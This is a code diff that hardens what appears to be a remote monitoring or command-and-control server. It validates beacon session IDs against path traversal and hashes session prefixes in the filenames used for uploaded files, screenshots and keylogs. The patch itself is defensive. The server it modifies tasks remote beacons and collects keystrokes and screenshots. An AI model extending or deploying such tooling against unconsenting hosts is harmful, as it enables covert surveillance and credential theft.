@@ -14,8 +14,11 @@ Enhanced Features:
 - Persistence management
 """
 
+from __future__ import annotations
+
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 import argparse
+import hashlib
 import re
 import secrets
 import threading
@@ -70,6 +73,35 @@ def secure_compare(provided: str, expected: str) -> bool:
     a = provided.encode("utf-8", errors="replace")
     b = expected.encode("utf-8", errors="replace")
     return secrets.compare_digest(a, b)
+
+
+_BEACON_SESSION_UUID_RE = re.compile(
+    r"^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$"
+)
+_BEACON_SESSION_TOKEN_RE = re.compile(r"^[A-Za-z0-9_-]{8,128}$")
+
+
+def validate_beacon_session_id(session_id: str) -> str | None:
+    """Reject path-like or unsafe beacon session IDs (blocks /tmp/pwn style abuse)."""
+    if not session_id or not isinstance(session_id, str):
+        return None
+    sid = session_id.strip()
+    if len(sid) < 8 or len(sid) > 128:
+        return None
+    if "/" in sid or "\\" in sid or ".." in sid or "\0" in sid:
+        return None
+    if sid.startswith(".") or sid.endswith("."):
+        return None
+    if _BEACON_SESSION_UUID_RE.match(sid):
+        return sid
+    if _BEACON_SESSION_TOKEN_RE.match(sid):
+        return sid
+    return None
+
+
+def safe_session_storage_prefix(session_id: str) -> str:
+    """Hash-based prefix for artifact filenames — never use session_id[:8] on disk."""
+    return hashlib.sha256(session_id.encode("utf-8")).hexdigest()[:12]
 
 
 def safe_storage_filename(filename: str, default: str = "download") -> str:
@@ -667,7 +699,7 @@ class RMMServer:
                 content = base64.b64decode(data.get("content", ""))
                 filepath = safe_join_under(
                     os.path.join(LOG_DIR, "downloads"),
-                    f"{session.id[:8]}_{filename}",
+                    f"{safe_session_storage_prefix(session.id)}_{filename}",
                 )
                 with open(filepath, 'wb') as f:
                     f.write(content)
@@ -682,7 +714,9 @@ class RMMServer:
             try:
                 content = base64.b64decode(result)
                 filepath = safe_join_under(
-                    LOG_DIR, "screenshots", f"{session.id[:8]}_{timestamp}.png"
+                    LOG_DIR,
+                    "screenshots",
+                    f"{safe_session_storage_prefix(session.id)}_{timestamp}.png",
                 )
                 with open(filepath, 'wb') as f:
                     f.write(content)
@@ -696,7 +730,9 @@ class RMMServer:
         elif cmd_type == "keylog":
             try:
                 filepath = safe_join_under(
-                    LOG_DIR, "keylogs", f"{session.id[:8]}_{timestamp}.log"
+                    LOG_DIR,
+                    "keylogs",
+                    f"{safe_session_storage_prefix(session.id)}_{timestamp}.log",
                 )
                 with open(filepath, 'w', encoding='utf-8') as f:
                     f.write(result)
@@ -875,6 +911,17 @@ class RMMHandler(BaseHTTPRequestHandler):
         if header:
             return header
         return qs.get("beacon_token", [""])[0].strip()
+
+    @staticmethod
+    def _beacon_session_id_from_qs(qs) -> tuple[str | None, str | None]:
+        """Return (error_message, session_id). error_message is set when id is missing or invalid."""
+        raw = qs.get("id", [None])[0]
+        if raw is None or not str(raw).strip():
+            return "Missing session ID", None
+        session_id = validate_beacon_session_id(str(raw))
+        if not session_id:
+            return "INVALID SESSION ID", None
+        return None, session_id
 
     def _beacon_authorized(self, qs):
         if INSECURE and not BEACON_SECRET:
@@ -1141,36 +1188,39 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return
 
         if path == "/register":
-            session_id = qs.get("id", [None])[0]
+            raw_id = qs.get("id", [None])[0]
+            if raw_id is None or not str(raw_id).strip():
+                self._respond(400, "Missing session ID")
+                return
+            session_id = validate_beacon_session_id(str(raw_id))
+            if not session_id:
+                self._respond(400, "INVALID SESSION ID")
+                return
             hostname = qs.get("h", ["unknown"])[0]
             username = qs.get("u", ["unknown"])[0]
             ip = self.client_address[0]
-            
-            if session_id:
-                reg = self.server_instance.register_session(session_id, hostname, username, ip)
-                if reg is None:
-                    self._respond(403, "TERMINATED")
-                else:
-                    self._respond(200, "REGISTERED" if reg else "UPDATED")
+            reg = self.server_instance.register_session(session_id, hostname, username, ip)
+            if reg is None:
+                self._respond(403, "TERMINATED")
             else:
-                self._respond(400, "Missing session ID")
+                self._respond(200, "REGISTERED" if reg else "UPDATED")
         
         elif path == "/cmd":
-            session_id = qs.get("id", [None])[0]
-            if session_id:
+            err, session_id = self._beacon_session_id_from_qs(qs)
+            if err:
+                self._respond(400, err)
+            else:
                 cmd, resp_type = self.server_instance.get_command(session_id)
                 response = json.dumps({"command": cmd, "type": resp_type})
                 self._respond(200, response, "application/json")
-            else:
-                self._respond(400, "Missing session ID")
         
         elif path == "/ping":
-            session_id = qs.get("id", [None])[0]
-            if session_id:
+            err, session_id = self._beacon_session_id_from_qs(qs)
+            if err:
+                self._respond(400, err)
+            else:
                 self.server_instance.touch_session(session_id)
                 self._respond(200, "PONG")
-            else:
-                self._respond(400, "Missing session ID")
         
         else:
             self._respond(404, "Not Found")
@@ -1205,14 +1255,17 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return
 
         if path == "/result":
-            session_id = qs.get("id", [None])[0]
+            raw_id = qs.get("id", [None])[0]
             result_type = qs.get("type", ["output"])[0]
-            
-            if session_id:
-                self.server_instance.handle_result(session_id, body, result_type)
-                self._respond(200, "OK")
-            else:
+            if raw_id is None or not str(raw_id).strip():
                 self._respond(400, "Missing session ID")
+                return
+            session_id = validate_beacon_session_id(str(raw_id))
+            if not session_id:
+                self._respond(400, "INVALID SESSION ID")
+                return
+            self.server_instance.handle_result(session_id, body, result_type)
+            self._respond(200, "OK")
         
         else:
             self._respond(404, "Not Found")
